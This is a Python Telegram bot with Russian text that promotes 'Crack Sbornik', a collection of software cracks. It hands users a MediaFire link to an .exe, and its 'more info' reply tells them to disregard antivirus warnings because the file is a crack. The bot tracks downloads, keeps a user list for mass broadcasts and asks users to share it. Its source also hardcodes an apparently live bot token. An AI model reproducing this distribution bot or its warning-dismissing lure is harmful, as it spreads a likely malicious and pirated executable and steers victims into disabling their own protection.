import telebot
from telebot import types
import time

TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ЗАМЕНИТЕ НА СВОЙ ТОКЕН
SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
IMAGE_URL = "https://i.ibb.co/KpKqsd8x/gg.png"

# ⚠️ ВСТАВЬТЕ СВОЙ TELEGRAM ID (узнать можно у @userinfobot)
ADMIN_ID = 7859226148  # ЗАМЕНИТЕ НА СВОЙ ID

bot = telebot.TeleBot(TOKEN)

# Статистика
download_count = 0
users = set()
user_last_use = {}

def check_cooldown(user_id):
    current_time = time.time()
    if user_id in user_last_use:
        time_passed = current_time - user_last_use[user_id]
        if time_passed < 5:
            return int(5 - time_passed)
    return 0

def update_cooldown(user_id):
    user_last_use[user_id] = time.time()

# Проверка на админа
def is_admin(user_id):
    return user_id == ADMIN_ID

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    users.add(user_id)
    
    remaining = check_cooldown(user_id)
    if remaining > 0:
        bot.send_message(message.chat.id, f"⏳ Подожди {remaining} секунд!")
        return
    
    update_cooldown(user_id)
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("📥 Скачать софт", callback_data="download")
    button2 = types.InlineKeyboardButton("🎯 Подробнее", callback_data="more")
    keyboard.add(button1, button2)
    
    # Кнопка "Поделиться" для всех
    button3 = types.InlineKeyboardButton("👥 Поделиться", callback_data="share")
    keyboard.add(button3)
    
    bot.send_message(message.chat.id, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=keyboard)

# Админ-панель
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ У вас нет доступа к этой команде!")
        return
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    btn2 = types.InlineKeyboardButton("📝 Сменить ссылку", callback_data="admin_change_link")
    btn3 = types.InlineKeyboardButton("👥 Количество пользователей", callback_data="admin_users")
    btn4 = types.InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")
    btn5 = types.InlineKeyboardButton("🖼 Сменить картинку", callback_data="admin_change_image")
    btn6 = types.InlineKeyboardButton("🔴 Остановить бота", callback_data="admin_stop")
    keyboard.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.send_message(message.chat.id, "🔧 **Админ-панель**\nВыберите действие:", parse_mode="Markdown", reply_markup=keyboard)

# Обработка кнопок админ-панели
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа!", show_alert=True)
        return
    
    if call.data == "admin_stats":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"📊 **Статистика:**\n\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}", parse_mode="Markdown")
    
    elif call.data == "admin_users":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"👥 **Всего пользователей:** {len(users)}")
    
    elif call.data == "admin_change_link":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📝 **Отправьте новую ссылку для скачивания:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, change_link)
    
    elif call.data == "admin_change_image":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🖼 **Отправьте новую ссылку на картинку:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, change_image)
    
    elif call.data == "admin_broadcast":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📢 **Введите текст для рассылки:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, broadcast)
    
    elif call.data == "admin_stop":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🔴 **Бот остановлен!**")
        time.sleep(1)
        exit()

# Функции для изменения данных
def change_link(message):
    global SOFT_LINK
    if not is_admin(message.from_user.id):
        return
    SOFT_LINK = message.text.strip()
    bot.send_message(message.chat.id, f"✅ Ссылка успешно изменена!\n\n🔗 Новая ссылка:\n{SOFT_LINK}")

def change_image(message):
    global IMAGE_URL
    if not is_admin(message.from_user.id):
        return
    IMAGE_URL = message.text.strip()
    bot.send_message(message.chat.id, f"✅ Картинка успешно изменена!\n\n🖼 Новая ссылка:\n{IMAGE_URL}")

def broadcast(message):
    if not is_admin(message.from_user.id):
        return
    
    text = message.text.strip()
    success = 0
    fail = 0
    
    bot.send_message(message.chat.id, "📢 **Начинаю рассылку...**\n\n⏳ Это может занять некоторое время", parse_mode="Markdown")
    
    for user_id in users:
        try:
            bot.send_message(user_id, f"📢 **Новость от админа:**\n\n{text}", parse_mode="Markdown")
            success += 1
        except:
            fail += 1
        time.sleep(0.05)  # Чтобы не спамить
    
    bot.send_message(message.chat.id, f"✅ **Рассылка завершена!**\n\n📨 Доставлено: {success}\n❌ Ошибок: {fail}")

# Основные кнопки бота
@bot.callback_query_handler(func=lambda call: call.data in ["download", "more", "share"])
def callback(call):
    user_id = call.from_user.id
    users.add(user_id)
    remaining = check_cooldown(user_id)
    
    if remaining > 0:
        bot.answer_callback_query(call.id, f"⏳ Подожди {remaining} сек!", show_alert=True)
        return
    
    update_cooldown(user_id)
    
    if call.data == "download":
        global download_count
        download_count += 1
        bot.answer_callback_query(call.id, "✅ Ссылка отправлена!", show_alert=False)
        bot.send_message(call.message.chat.id, f"🔗 **Ссылка для скачивания:**\n{SOFT_LINK}", parse_mode="Markdown")
    
    elif call.data == "more":
        bot.answer_callback_query(call.id, "📸 Картинка отправлена!", show_alert=False)
        bot.send_photo(call.message.chat.id, IMAGE_URL, caption="☢️ **антивирус может ругаться на софт потому что это кряк** ☢️", parse_mode="Markdown")
    
    elif call.data == "share":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"👥 **Поделиться ботом:**\n\nhttps://t.me/{bot.get_me().username}\n\n📎 Отправь эту ссылку друзьям!", parse_mode="Markdown")

# Команда /help
@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(message.chat.id, "❓ **Помощь:**\n\n/start - Главное меню\n/admin - Админ-панель (только для админа)\n\n📥 Скачать софт - Получить ссылку\n🎯 Подробнее - Информация о софте\n👥 Поделиться - Пригласить друзей", parse_mode="Markdown")

print("✅ Бот запущен с админ-панелью!")
bot.infinity_polling()
